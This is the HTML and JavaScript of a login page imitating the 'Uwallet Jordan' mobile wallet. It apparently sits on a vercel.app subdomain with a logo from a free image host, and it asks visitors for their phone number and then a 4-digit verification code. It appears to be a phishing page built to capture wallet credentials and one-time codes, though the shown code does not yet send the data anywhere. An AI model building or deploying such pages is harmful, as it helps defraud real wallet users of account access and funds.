<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Uwallet الأردن | تسجيل الدخول</title>
  <!-- Open Graph Meta Tags for Link Preview -->
  <meta property="og:title" content="Uwallet الأردن | تسجيل الدخول" />
  <meta property="og:description" content="سجل دخولك لخدمات Uwallet الأردن بأمان وسهولة!" />
  <meta property="og:image" content="https://d.top4top.io/p_3619v3uia0.jpeg" />
  <meta property="og:url" content="https://uwalletjordan.vercel.app" />
  <meta property="og:type" content="website" />
  <meta property="og:locale" content="ar_AR" />
  <!-- Twitter Card Meta Tags -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Uwallet الأردن | تسجيل الدخول" />
  <meta name="twitter:description" content="سجل دخولك لخدمات Uwallet الأردن بأمان وسهولة!" />
  <meta name="twitter:image" content="https://d.top4top.io/p_3619v3uia0.jpeg" />
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
  <style>
    :root {
      --uwallet-blue: #1a84dd;
      --uwallet-dark: #00486e;
      --uwallet-gray: #f4f9fb;
      --uwallet-light-blue: #00a6e8;
      --uwallet-accent: #209dbf;
      --uwallet-pink: #ea4763;
    }
    body {
      background: linear-gradient(135deg, var(--uwallet-blue) 0%, var(--uwallet-dark) 83%);
      min-height: 100vh;
      font-family: 'Cairo', Arial, sans-serif;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #app {
      background: #fff;
      border-radius: 22px;
      box-shadow: 0 8px 32px 0 rgba(26,132,221,0.10), 0 2px 12px #209dbf22;
      width: 370px;
      max-width: 95vw;
      padding: 34px 26px 32px 26px;
      box-sizing: border-box;
      direction: rtl;
      position: relative;
      overflow: hidden;
      border: 2.5px solid var(--uwallet-blue);
      animation: fadein 0.7s;
    }
    @keyframes fadein {
      from { opacity: 0; transform: translateY(36px);}
      to { opacity: 1; transform: none;}
    }
    .uwallet-header {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 18px;
      gap: 10px;
      flex-direction: row;
    }
    .uwallet-logo {
      width: 62px;
      height: 62px;
      border-radius: 18px;
      background: linear-gradient(135deg, var(--uwallet-blue) 55%, var(--uwallet-pink) 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 2px 16px #1a84dd19;
      border: 2.5px solid #fff;
      overflow: hidden;
    }
    .uwallet-logo img {
      width: 56px;
      height: 56px;
      object-fit: contain;
      background: #fff;
      border-radius: 15px;
      border: 1.5px solid #e3eefe;
      box-shadow: 0 1px 6px #1a84dd19;
    }
    .uwallet-title-main {
      font-size: 23px;
      font-weight: 900;
      letter-spacing: 0.2px;
      color: var(--uwallet-dark);
      margin: 0;
      text-shadow: 0 1px 0 #fff, 0 2px 10px #1a84dd12;
    }
    .uwallet-title-sub {
      font-size: 15px;
      color: var(--uwallet-accent);
      font-weight: 600;
      text-align: center;
      margin: 6px 0 0 0;
      letter-spacing: 0.07px;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 13px;
      margin-top: 7px;
    }
    label {
      color: var(--uwallet-blue);
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 3px;
      margin-right: 2px;
      letter-spacing: 0.18px;
    }
    input {
      padding: 14px 11px;
      border: none;
      border-radius: 9px;
      font-size: 15px;
      background: var(--uwallet-gray);
      color: #222;
      outline: none;
      box-shadow: 0 1.5px 5px #1a84dd13;
      transition: box-shadow 0.2s, border 0.2s;
      border: 2px solid #209dbf18;
      font-family: 'Cairo', Arial, sans-serif;
    }
    input:focus {
      box-shadow: 0 3px 12px #209dbf40;
      border-color: var(--uwallet-blue);
      background: #f6fcff;
    }
    .button {
      background: linear-gradient(90deg, var(--uwallet-blue) 0%, var(--uwallet-pink) 100%);
      color: white;
      border: none;
      border-radius: 9px;
      padding: 13px 0;
      font-size: 17px;
      font-weight: 800;
      cursor: pointer;
      margin-top: 7px;
      margin-bottom: 3px;
      transition: background 0.18s, opacity 0.15s;
      letter-spacing: 0.6px;
      box-shadow: 0 1px 5px #209dbf19;
    }
    .button:active { opacity: 0.87; }
    .info-msg {
      text-align: center;
      color: var(--uwallet-blue);
      font-size: 13px;
      margin-bottom: 7px;
      margin-top: 2px;
      font-weight: 600;
      letter-spacing: 0.1px;
    }
    .code-inputs {
      display: flex;
      justify-content: center;
      margin: 10px 0 9px 0;
    }
    .code-inputs input {
      text-align: center;
      font-size: 18px;
      width: 85px; /* تكبير الحجم */
      padding: 13px 0;
      letter-spacing: 4px;
      border-radius: 7px;
      border: 2px solid #1a84dd20;
      background: var(--uwallet-gray);
      font-weight: 700;
      box-shadow: 0 1.5px 5px #209dbf18;
      transition: border 0.2s, box-shadow 0.2s;
    }
    @media (max-width: 450px) {
      #app { padding: 12px 1vw 6px 1vw; }
      .uwallet-title-main { font-size: 17px; }
    }
  </style>
</head>
<body>
  <div id="app"></div>
  <script>
    const uwalletLogo = "https://d.top4top.io/p_3619v3uia0.jpeg";
    let userData = { phone: '' };

    function render() {
      // Step 1: Phone Input
      document.getElementById('app').innerHTML = `
        <div class="uwallet-header">
          <div class="uwallet-logo"><img src="${uwalletLogo}" alt="Uwallet" /></div>
          <span class="uwallet-title-main">Uwallet الأردن</span>
        </div>
        <form id="step1Form">
          <label>رقم الهاتف</label>
          <input type="tel" id="phone" maxlength="10" placeholder="07XXXXXXXX" required />
          <button type="submit" class="button">التالي</button>
        </form>
      `;

      document.getElementById('step1Form').onsubmit = function(e) {
        e.preventDefault();
        userData.phone = document.getElementById('phone').value.trim();
        renderCodeVerification();
      };
    }

    function renderCodeVerification() {
      document.getElementById('app').innerHTML = `
        <form id="codeForm">
          <label>رمز التحقق</label>
          <div class="code-inputs">
            <input type="text" maxlength="4" placeholder="****" required />
          </div>
          <button type="submit" class="button">تأكيد</button>
        </form>
      `;
    }

    render();
  </script>
</body>
</html>
